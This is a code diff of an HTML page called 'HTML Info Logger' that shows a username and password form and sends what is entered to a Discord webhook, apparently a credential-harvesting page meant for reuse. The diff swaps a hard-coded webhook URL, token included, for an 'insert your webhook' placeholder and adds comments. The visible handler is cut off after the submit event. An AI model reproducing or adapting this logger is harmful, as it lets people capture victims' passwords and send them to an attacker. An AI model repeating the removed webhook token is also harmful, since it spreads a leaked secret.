@@ -83,13 +83,13 @@
 </head>
 <body>
   <div class="container">
-    <h1>HTML Info Logger</h1> 
-    <h2>@DARKNOSY</h2> 
+    <h1>HTML Info Logger</h1> <!--Title-->
+    <h2>@DARKNOSY</h2> <!--Subtitle-->
     <form id="webhookForm">
-      <label for="username">Username:</label>
+      <label for="username">Username:</label> <!--First Field-->
       <input type="text" id="username" required>
 
-      <label for="password">Password:</label>
+      <label for="password">Password:</label> <!--Second Field-->
       <input type="password" id="password" required>
 
       <button type="submit">Submit</button>
@@ -101,7 +101,7 @@
     $(document).ready(function() {
       var avatarUrl = 'https://avatars.githubusercontent.com/u/109553205?v=4';
       var username = "HTML Info Logger / @DARKNOSY";
-      var webhookUrl = "https://discord.com/api/webhooks/1108438357958213694/gq_3SA2Vrsz0o0s4o9TTQbGENEvOEpw-OsHSuPXxuB5U34VQ0ETkmbiC0U2U_9ATJixE";
+      var webhookUrl = "INSERT-YOUR-WEBHOOK-LINK-HERE"; <!--Literally read-->
 
       $("#webhookForm").submit(function(event) {
         event.preventDefault();
